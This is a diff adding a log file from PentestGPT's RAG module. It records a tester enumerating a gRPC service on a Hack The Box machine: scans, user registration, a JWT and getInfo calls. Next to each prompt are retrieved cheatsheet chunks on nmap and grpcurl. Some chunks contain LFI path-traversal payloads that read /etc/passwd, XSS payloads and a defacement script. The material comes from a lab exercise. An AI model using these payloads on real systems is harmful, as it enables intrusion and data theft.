@@ -1,0 +1,1321 @@
+2024-05-06 17:16:46,546 - INFO - pentestgpt.utils.rag.Local_RAG - Created FAISS index
+2024-05-06 17:16:46,546 - INFO - pentestgpt.utils.rag.Local_RAG - Initialized Local_RAG
+2024-05-06 17:19:09,175 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 1.13) | prompt: I have a Linux hack the box macine. The target IP is 10.10.11.214 | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-06 17:21:14,481 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 1] (Score: 1.18) | prompt:  1. Port 22/tcp: open, service is ssh, version is OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+2. Port 50051/tcp: open, service is unknown (unrecognized despite returning data)
+3. OS: Linux
+4. CPE: cpe:/o:linux:linux_kernel | rag-data: CP packets with no flags set (NULL packets) to target ports. The response (or lack thereof) helps identify open, closed, or filtered ports.
+   ```
+   nmap -sN <target-ip>
+   ```
+
+8. **TCP FIN Scan**:
+   - Similar to the NULL scan, the FIN scan sends TCP packets with the FIN flag set to target ports, aiming to detect open ports based on the response or lack thereof.
+   ```
+   nmap -sF <target-ip>
+   ```
+
+9. **TCP ACK Scan**:
+   - This scan sends TCP packets with only the ACK flag set to target ports, useful for determining firewall rules and filtering policies.
+   ```
+   nmap -sA <target-ip>
+   ```
+
+10. **Operating System Detection**:
+    - This scan focuses on identifying the operating system running on the target machine, providing information such as OS type, version, and possible OS families.
+    ```
+    nmap -O <target-ip>
+    ```
+
+11. **Service Version Detection**:
+    - This scan probes open ports to identify the services running on them and their versions, helping to assess potential vulnerabilities and security risks.
+    ```
+    nmap -sV <target-ip>
+    ```
+
+12. **RPC Scan**:
+    - RPC scan is used specifically to enumerate RPC services on the target machine, revealing information about available RPC services and their versions.
+    ```
+    nmap -sR <target-ip>
+    ```
+  
+2024-05-06 17:22:53,822 - INFO - pentestgpt.utils.rag.Local_RAG - - grpcurl.md [Chunk 0] (Score: 0.74) | prompt:  1. Port 50051/tcp: open, service is gRPC
+ | rag-data: # grpcurl
+grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
+Common ports for gRPC services include 50051
+
+## Example commands:
+### grpcurl -plaintext -vv <ip:port> list
+	Use this for initial scan of the gRPC API.
+	Outputs a list of available services at the given address:port.
+	-plaintext flag says to not use TLS when connecting.
+
+### grpcurl -plaintext -vv <ip:port> list <Service>
+	Use this to gather information about a service provided by the gRPC API.
+	Outputs a list of available methods for the given service.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv <ip:port> describe <Service>
+	Outputs the available methods for the given service with each methods input parameters and expected output.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+	Submits data to the given service.method endpoint.
+	-plaintext flag says to not use TSL when connecting.
+	-format text flag tells the given input data is in a text format.
+	-d '<input string>' flag tells what data to submit.
+2024-05-06 17:28:38,199 - INFO - pentestgpt.utils.rag.Local_RAG - - grpcurl.md [Chunk 0] (Score: 0.65) | prompt:  1. Port 50051/tcp: open, service is gRPC, grpcurl response indicates a successful connection and retrieval of reflection data
+
+ | rag-data: # grpcurl
+grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
+Common ports for gRPC services include 50051
+
+## Example commands:
+### grpcurl -plaintext -vv <ip:port> list
+	Use this for initial scan of the gRPC API.
+	Outputs a list of available services at the given address:port.
+	-plaintext flag says to not use TLS when connecting.
+
+### grpcurl -plaintext -vv <ip:port> list <Service>
+	Use this to gather information about a service provided by the gRPC API.
+	Outputs a list of available methods for the given service.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv <ip:port> describe <Service>
+	Outputs the available methods for the given service with each methods input parameters and expected output.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+	Submits data to the given service.method endpoint.
+	-plaintext flag says to not use TSL when connecting.
+	-format text flag tells the given input data is in a text format.
+	-d '<input string>' flag tells what data to submit.
+2024-05-06 17:31:46,945 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.92) | prompt:  Penetration Testing Tree (PTT):
+
+1. Reconnaissance - (complete)
+  1.1. Network Scanning - (complete)
+    1.1.1. Port Scanning - (complete)
+    1.1.2. Service Identification - (complete)
+    1.1.3. Network Mapping - (complete)
+  1.2. Open Source Intelligence (OSINT) Gathering - (complete)
+  1.3. Passive Network Monitoring - (complete)
+  1.4. Vulnerability Scanning - (to-do)
+    1.4.1. Network-based Vulnerability Scanning - (to-do)
+    1.4.2. Host-based Vulnerability Scanning - (to-do)
+  1.5. Threat Modeling - (to-do)
+    1.5.1. Identifying Threat Actors - (to-do)
+    1.5.2. Assessing Threat Capabilities - (to-do)
+    1.5.3. Prioritizing Threats - (to-do)
+
+2. Initial Access - (to-do)
+  2.1. Investigate the service - (to-do)
+3. Privilege Escalation - (to-do)
+   3.1. Look for ports on the local network 127.0.0.1 - (to-do)
+   3.2. Scan for files that current user runs as root - (to-do)
+
+New Information:
+1. Port 50051/tcp: open, service is gRPC, grpcurl response indicates a successful connection and retrieval of reflection data
+2. The system has implemented Retrieval-augmented generation (RAG) which does a similarity search on the user prompt to a local dataset.
+
+Perform the task:
+
+1. Analyze the port 50051/tcp and the gRPC service.
+2. Use grpcurl to interact with the gRPC server, and perform actions such as listing available services, gathering information about a service, and submitting data to the service.
+
+Example commands:
+grpcurl -plaintext -vv <ip:port> list
+grpcurl -plaintext -vv <ip:port> list <Service>
+grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+
+ Penetration Testing Tree (PTT):
+
+1. Reconnaissance - (complete)
+  1.1. Network Scanning - (complete)
+    1.1.1. Port Scanning - (complete)
+    1.1.2. Service Identification - (complete)
+    1.1.3. Network Mapping - (complete)
+  1.2. Open Source Intelligence (OSINT) Gathering - (complete)
+  1.3. Passive Network Monitoring - (complete)
+  1.4. Vulnerability Scanning - (to-do)
+    1.4.1. Network-based Vulnerability Scanning - (to-do)
+    1.4.2. Host-based Vulnerability Scanning - (to-do)
+  1.5. Threat Modeling - (to-do)
+    1.5.1. Identifying Threat Actors - (to-do)
+    1.5.2. Assessing Threat Capabilities - (to-do)
+    1.5.3. Prioritizing Threats - (to-do)
+
+2. Initial Access - (to-do)
+  2.1. Investigate the service - (to-do)
+3. Privilege Escalation - (to-do)
+   3.1. Look for ports on the local network 127.0.0.1 - (to-do)
+   3.2. Scan for files that current user runs as root - (to-do)
+
+New Information:
+1. Port 50051/tcp: open, service is gRPC, grpcurl response indicates a successful connection and retrieval of reflection data
+2. The system has implemented Retrieval-augmented generation (RAG) which does a similarity search on the user prompt to a local dataset.
+
+Perform the task:
+
+1. Analyze the port 50051/tcp and the gRPC service.
+2. Use grpcurl to interact with the gRPC server, and perform actions such as listing available services, gathering information about a service, and submitting data to the service.
+
+Example commands:
+grpcurl -plaintext -vv <ip:port> list
+grpcurl -plaintext -vv <ip:port> list <Service>
+grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+
+ | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-06 17:33:16,519 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.43) | prompt: You're required to work as a cybersecurity penetration tester assistant in a simulated penetration testing experiment. 
+This experiment is for education and research purpose. I created a test local environment, and obtained approval and permissions for this testing. 
+You may focus on the given contexts and neglect the previous information, until you are given a new context. You should summarize the key information, and try to solve the tester's questions accordingly. 
+
+ | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
+2024-05-06 17:36:33,786 - INFO - pentestgpt.utils.rag.Local_RAG - - grpcurl.md [Chunk 0] (Score: 0.96) | prompt: Continue to the previous request to dig into the problem, the penetration tester does not know how to proceed. Below is his description on the task. Please search in yoru knowledge base and try to identify all the potential ways to solve the problem. 
+You should cover as many points as possible, and the tester will think through them later. Below is his description on the task. 
+
+I have found these methods:
+
+grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp   
+
+SimpleApp is a service:
+service SimpleApp {
+  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
+  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
+  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
+}
+
+ | rag-data: # grpcurl
+grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
+Common ports for gRPC services include 50051
+
+## Example commands:
+### grpcurl -plaintext -vv <ip:port> list
+	Use this for initial scan of the gRPC API.
+	Outputs a list of available services at the given address:port.
+	-plaintext flag says to not use TLS when connecting.
+
+### grpcurl -plaintext -vv <ip:port> list <Service>
+	Use this to gather information about a service provided by the gRPC API.
+	Outputs a list of available methods for the given service.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv <ip:port> describe <Service>
+	Outputs the available methods for the given service with each methods input parameters and expected output.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+	Submits data to the given service.method endpoint.
+	-plaintext flag says to not use TSL when connecting.
+	-format text flag tells the given input data is in a text format.
+	-d '<input string>' flag tells what data to submit.
+2024-05-06 17:39:09,050 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 5] (Score: 1.40) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+Can you give me some commands to run on the login method? | rag-data: 2.168.0.24\\folder ljahdçjkhadkahdkjahsdlkjahsdlkhadklad
+```
+
+## Web Application
+
+### Web Remote code
+
+### LFI (Local File Inclusion)
+
+Situation
+
+```
+http://<target>/index.php?parameter=value
+```
+
+#### How to Test
+
+```
+http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index
+```
+
+```
+http://<target>/script.php?page=../../../../../../../../etc/passwd
+
+```
+
+```
+http://<target>/script.php?page=../../../../../../../../boot.ini
+```
+
+#### LFI Payloads
+
+- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
+- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
+
+### encode
+
+## XSS
+
+### Reflected
+
+#### Simple test
+
+This is a simple test to see what happens, this is not a prove that the field is vuln to xss
+
+```javascript
+<plaintext>
+```
+
+#### Simple XSS test
+
+```javascript
+<script>alert('Found')</script>
+```
+
+```javascript
+"><script>alert(Found)</script>">
+```
+
+```javascript
+<script>alert(String.fromCharCode(88,83,83))</script>
+```
+
+#### Bypass filter of tag script
+
+`"  onload="alert(String.fromCharCode(88,83,83))`
+
+```javascript
+" onload="alert('XSS')
+```
+
+bla is not a valid image, so this cause an error
+
+```javascript
+<img src='bla' onerror=alert("XSS")>
+```
+
+### Persistent
+
+```javascript
+>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";
+```
+
+### PHP collector
+
+`> cookie.txt`
+`chmod 
+2024-05-06 17:44:51,637 - INFO - pentestgpt.utils.rag.Local_RAG - - grpcurl.md [Chunk 0] (Score: 0.96) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+I got this error:
+
+grpcurl -plaintext -vv -format text -d '{"Username": "testuser", "Password": "testpassword" }' 10.10.11.214:50051 SimpleApp.LoginUser
+
+Resolved method descriptor:
+rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
+
+Request metadata to send:
+(empty)
+Error invoking method "SimpleApp.LoginUser": error getting request data: line 1, col 1: Expecting an identifier or tag number; instead got "{"
+ | rag-data: # grpcurl
+grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
+Common ports for gRPC services include 50051
+
+## Example commands:
+### grpcurl -plaintext -vv <ip:port> list
+	Use this for initial scan of the gRPC API.
+	Outputs a list of available services at the given address:port.
+	-plaintext flag says to not use TLS when connecting.
+
+### grpcurl -plaintext -vv <ip:port> list <Service>
+	Use this to gather information about a service provided by the gRPC API.
+	Outputs a list of available methods for the given service.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv <ip:port> describe <Service>
+	Outputs the available methods for the given service with each methods input parameters and expected output.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+	Submits data to the given service.method endpoint.
+	-plaintext flag says to not use TSL when connecting.
+	-format text flag tells the given input data is in a text format.
+	-d '<input string>' flag tells what data to submit.
+2024-05-06 17:46:02,136 - INFO - pentestgpt.utils.rag.Local_RAG - - grpcurl.md [Chunk 0] (Score: 0.97) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+Got a new error:
+
+grpcurl -plaintext -vv -format json -d '{"Username": "testuser", "Password": "testpassword" }' 10.10.11.214:50051 SimpleApp.LoginUser
+
+Resolved method descriptor:
+rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
+
+Request metadata to send:
+(empty)
+Error invoking method "SimpleApp.LoginUser": error getting request data: message type LoginUserRequest has no known field named Username | rag-data: # grpcurl
+grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
+Common ports for gRPC services include 50051
+
+## Example commands:
+### grpcurl -plaintext -vv <ip:port> list
+	Use this for initial scan of the gRPC API.
+	Outputs a list of available services at the given address:port.
+	-plaintext flag says to not use TLS when connecting.
+
+### grpcurl -plaintext -vv <ip:port> list <Service>
+	Use this to gather information about a service provided by the gRPC API.
+	Outputs a list of available methods for the given service.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv <ip:port> describe <Service>
+	Outputs the available methods for the given service with each methods input parameters and expected output.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+	Submits data to the given service.method endpoint.
+	-plaintext flag says to not use TSL when connecting.
+	-format text flag tells the given input data is in a text format.
+	-d '<input string>' flag tells what data to submit.
+2024-05-06 17:47:17,936 - INFO - pentestgpt.utils.rag.Local_RAG - - grpcurl.md [Chunk 0] (Score: 0.83) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+I managed to get it working:
+
+grpcurl -plaintext -vv -format json -d '{"username": "testuser", "password": "testpassword" }' 10.10.11.214:50051 SimpleApp.LoginUser
+
+Resolved method descriptor:
+rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
+
+Request metadata to send:
+(empty)
+
+Response headers received:
+content-type: application/grpc
+grpc-accept-encoding: identity, deflate, gzip
+
+Estimated response size: 20 bytes
+
+Response contents:
+{
+  "message": "Login unsuccessful"
+}
+
+Response trailers received:
+(empty)
+Sent 1 request and received 1 response
+Timing Data: 17.130738ms
+  Dial: 7.367608ms
+    BlockingDial: 7.354453ms
+  InvokeRPC: 7.675656ms | rag-data: # grpcurl
+grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
+Common ports for gRPC services include 50051
+
+## Example commands:
+### grpcurl -plaintext -vv <ip:port> list
+	Use this for initial scan of the gRPC API.
+	Outputs a list of available services at the given address:port.
+	-plaintext flag says to not use TLS when connecting.
+
+### grpcurl -plaintext -vv <ip:port> list <Service>
+	Use this to gather information about a service provided by the gRPC API.
+	Outputs a list of available methods for the given service.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv <ip:port> describe <Service>
+	Outputs the available methods for the given service with each methods input parameters and expected output.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+	Submits data to the given service.method endpoint.
+	-plaintext flag says to not use TSL when connecting.
+	-format text flag tells the given input data is in a text format.
+	-d '<input string>' flag tells what data to submit.
+2024-05-06 17:48:48,087 - INFO - pentestgpt.utils.rag.Local_RAG - - grpcurl.md [Chunk 0] (Score: 0.89) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+I created a new user and logged in
+
+grpcurl -plaintext -vv -format json -d '{"username": "testuser", "password": "testpassword" }' 10.10.11.214:50051 SimpleApp.RegisterUser
+
+Resolved method descriptor:
+rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
+
+Request metadata to send:
+(empty)
+
+Response headers received:
+content-type: application/grpc
+grpc-accept-encoding: identity, deflate, gzip
+
+Estimated response size: 36 bytes
+
+Response contents:
+{
+  "message": "Account created for user testuser!"
+}
+
+Response trailers received:
+(empty)
+Sent 1 request and received 1 response
+Timing Data: 20.411942ms
+  Dial: 8.244613ms
+    BlockingDial: 8.234904ms
+  InvokeRPC: 10.319865ms
+
+
+grpcurl -plaintext -vv -format json -d '{"username": "testuser", "password": "testpassword" }' 10.10.11.214:50051 SimpleApp.LoginUser
+
+Resolved method descriptor:
+rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
+
+Request metadata to send:
+(empty)
+
+Response headers received:
+content-type: application/grpc
+grpc-accept-encoding: identity, deflate, gzip
+
+Estimated response size: 17 bytes
+
+Response contents:
+{
+  "message": "Your id is 594."
+}
+
+Response trailers received:
+token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3MTUwMjc3MjJ9.eGNuj40eHOKJ7zUI9M-2XZr463sLgWGBh-920CCKaNo'
+Sent 1 request and received 1 response
+Timing Data: 79.738336ms
+  Dial: 7.750335ms
+    BlockingDial: 7.741789ms
+  InvokeRPC: 69.990935ms
+ | rag-data: # grpcurl
+grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
+Common ports for gRPC services include 50051
+
+## Example commands:
+### grpcurl -plaintext -vv <ip:port> list
+	Use this for initial scan of the gRPC API.
+	Outputs a list of available services at the given address:port.
+	-plaintext flag says to not use TLS when connecting.
+
+### grpcurl -plaintext -vv <ip:port> list <Service>
+	Use this to gather information about a service provided by the gRPC API.
+	Outputs a list of available methods for the given service.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv <ip:port> describe <Service>
+	Outputs the available methods for the given service with each methods input parameters and expected output.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+	Submits data to the given service.method endpoint.
+	-plaintext flag says to not use TSL when connecting.
+	-format text flag tells the given input data is in a text format.
+	-d '<input string>' flag tells what data to submit.
+2024-05-06 17:49:52,695 - INFO - pentestgpt.utils.rag.Local_RAG - - grpcurl.md [Chunk 0] (Score: 0.73) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+grpcurl -plaintext -vv 10.10.11.214:50051 SimpleApp.getInfo
+
+Resolved method descriptor:
+rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
+
+Request metadata to send:
+(empty)
+
+Response headers received:
+content-type: application/grpc
+grpc-accept-encoding: identity, deflate, gzip
+
+Estimated response size: 44 bytes
+
+Response contents:
+{
+  "message": "Authorization Error.Missing 'token' header"
+}
+
+Response trailers received:
+(empty)
+Sent 0 requests and received 1 response
+Timing Data: 16.362356ms
+  Dial: 7.077783ms
+    BlockingDial: 7.067374ms
+  InvokeRPC: 7.307956ms | rag-data: # grpcurl
+grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
+Common ports for gRPC services include 50051
+
+## Example commands:
+### grpcurl -plaintext -vv <ip:port> list
+	Use this for initial scan of the gRPC API.
+	Outputs a list of available services at the given address:port.
+	-plaintext flag says to not use TLS when connecting.
+
+### grpcurl -plaintext -vv <ip:port> list <Service>
+	Use this to gather information about a service provided by the gRPC API.
+	Outputs a list of available methods for the given service.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv <ip:port> describe <Service>
+	Outputs the available methods for the given service with each methods input parameters and expected output.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+	Submits data to the given service.method endpoint.
+	-plaintext flag says to not use TSL when connecting.
+	-format text flag tells the given input data is in a text format.
+	-d '<input string>' flag tells what data to submit.
+2024-05-06 17:54:51,546 - INFO - pentestgpt.utils.rag.Local_RAG - - grpcurl.md [Chunk 0] (Score: 0.89) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+grpcurl -plaintext -vv -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3MTUwMjc3MjJ9.eGNuj40eHOKJ7zUI9M-2XZr463sLgWGBh-920CCKaNo' 10.10.11.214:50051 SimpleApp.getInfo
+
+Resolved method descriptor:
+rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
+
+Request metadata to send:
+token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3MTUwMjc3MjJ9.eGNuj40eHOKJ7zUI9M-2XZr463sLgWGBh-920CCKaNo
+
+Response headers received:
+(empty)
+
+Response trailers received:
+content-type: application/grpc
+Sent 0 requests and received 0 responses
+ERROR:
+  Code: Unknown
+  Message: Unexpected <class 'TypeError'>: bad argument type for built-in operation | rag-data: # grpcurl
+grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
+Common ports for gRPC services include 50051
+
+## Example commands:
+### grpcurl -plaintext -vv <ip:port> list
+	Use this for initial scan of the gRPC API.
+	Outputs a list of available services at the given address:port.
+	-plaintext flag says to not use TLS when connecting.
+
+### grpcurl -plaintext -vv <ip:port> list <Service>
+	Use this to gather information about a service provided by the gRPC API.
+	Outputs a list of available methods for the given service.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv <ip:port> describe <Service>
+	Outputs the available methods for the given service with each methods input parameters and expected output.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+	Submits data to the given service.method endpoint.
+	-plaintext flag says to not use TSL when connecting.
+	-format text flag tells the given input data is in a text format.
+	-d '<input string>' flag tells what data to submit.
+2024-05-06 18:01:48,561 - INFO - pentestgpt.utils.rag.Local_RAG - - grpcurl.md [Chunk 0] (Score: 1.01) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3MTUwMjg0NjV9.4q25-fshz4uwCEIyel-_l8AwJIYjgwrK8NjqaziMSV8' -d 'id: "26"' 10.10.11.214:50051 SimpleApp.getInfo
+message: "Will update soon."
+ | rag-data: # grpcurl
+grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
+Common ports for gRPC services include 50051
+
+## Example commands:
+### grpcurl -plaintext -vv <ip:port> list
+	Use this for initial scan of the gRPC API.
+	Outputs a list of available services at the given address:port.
+	-plaintext flag says to not use TLS when connecting.
+
+### grpcurl -plaintext -vv <ip:port> list <Service>
+	Use this to gather information about a service provided by the gRPC API.
+	Outputs a list of available methods for the given service.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv <ip:port> describe <Service>
+	Outputs the available methods for the given service with each methods input parameters and expected output.
+	-plaintext flag says to not use TSL when connecting.
+
+### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
+	Submits data to the given service.method endpoint.
+	-plaintext flag says to not use TSL when connecting.
+	-format text flag tells the given input data is in a text format.
+	-d '<input string>' flag tells what data to submit.
+2024-05-06 18:02:08,146 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.41) | prompt: Continue to the previous request to dig into the problem, the penetration tester does not know how to proceed. Below is his description on the task. Please search in yoru knowledge base and try to identify all the potential ways to solve the problem. 
+You should cover as many points as possible, and the tester will think through them later. Below is his description on the task. 
+
+What should we do now? | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
